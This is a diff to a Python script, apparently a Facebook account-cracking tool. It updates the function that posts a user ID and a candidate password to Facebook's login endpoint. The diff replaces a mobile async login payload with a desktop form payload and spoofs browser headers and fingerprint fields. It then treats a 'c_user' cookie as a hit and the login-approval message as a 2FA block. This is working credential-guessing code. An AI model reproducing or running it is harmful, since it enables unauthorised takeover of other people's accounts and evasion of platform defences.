@@ -1750,93 +1750,47 @@ def d(uid,pwx,tl):
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
-    "__aaid": "0",
-    "__user": "0",
-    "__a": "1",
-    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-    "params": {
-        "params": {
-            "server_params": {
-                "credential_type": "password",
-                "username_text_input_id": "ukxzy8:65",
-                "password_text_input_id": "",
-                "login_source": "Login",
-                "login_credential_type": "none",
-                "server_login_source": "login",
-                "ar_event_source": "login_home_page",
-                "should_trigger_override_login_success_action": 0,
-                "should_trigger_override_login_2fa_action": 0,
-                "is_caa_perf_enabled": 0,
-                "reg_flow_source": "login_home_native_integration_point",
-                "caller": "gslr",
-                "is_from_landing_page": 0,
-                "is_from_empty_password": 0,
-                "is_from_password_entry_page": 0,
-                "is_from_assistive_id": 0,
-                "INTERNALlatency_qpl_marker_id": 36707139,
-                "INTERNALlatency_qpl_instance_id": "184916384000392",
-                "device_id": None,
-                "family_device_id": None,
-                "waterfall_id": "bf55587b-aee0-46cb-b45b-0ff01e3b44c6",
-                "offline_experiment_group": None,
-                "layered_homepage_experiment_group": None,
-                "is_platform_login": 0,
-                "is_from_logged_in_switcher": 0,
-                "is_from_logged_out": 0,
-                "access_flow_version": "F2_FLOW",
-                "INTERNAL_INFRA_THEME": "harm_f"
-            },
-            "client_input_params": {
-                "machine_id": "",
-                "contact_point": uid,
-                "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-                "accounts_list": [],
-                "fb_ig_device_id": [],
-                "secure_family_device_id": "",
-                "encrypted_msisdn": "",
-                "headers_infra_flow_id": "",
-                "try_num": 1,
-                "login_attempt_count": 1,
-                "event_flow": "login_manual",
-                "event_step": "home_page",
-                "openid_tokens": {},
-                "auth_secure_device_id": "",
-                "client_known_key_hash": "",
-                "has_whatsapp_installed": 0,
-                "sso_token_map_json_string": "",
-                "should_show_nested_nta_from_aymh": 0,
-                "lois_settings": {
-                    "lois_token": "",
-                    "lara_override": ""
-                }
-            }
-        }
-    }
-}
+            'jazoest':  re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd':  re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '1',
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'lgnrnd': '060644_83c4',
+            'lgnjs': '1730207205',
+            'email': uid,
+            'prefill_contact_point': uid,
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'true',
+            'ab_test_data': 'A/AAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAH/AHAHHAAABFAM',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             headers = {
-            'authority': 'mbasic.facebook.com',
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
+            'authority': 'www.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=525265914179580&kid_directed_site=0&app_id=525265914179580&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3D4edcd4e8-70e1-4d98-8027-b12fa4abd13e%26scope%3Demail%252Copenid%252Cpublic_profile%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc797f33c-b89b-4c92-9e19-fd2b5f0d5b65%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.canva.com%2Foauth%2Fauthorized%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4edcd4e8-70e1-4d98-8027-b12fa4abd13e%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
-            'sec-ch-prefers-color-scheme': 'light',
+            'origin': 'https://www.facebook.com',
+            'referer': 'https://www.facebook.com/',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"V2060"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"13.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-            'x-asbd-id': '129477',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'x-requested-with': 'XMLHttpRequest',
-            'x-response-format': 'JSONStream',}
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/"
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Ffacebook%2F&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
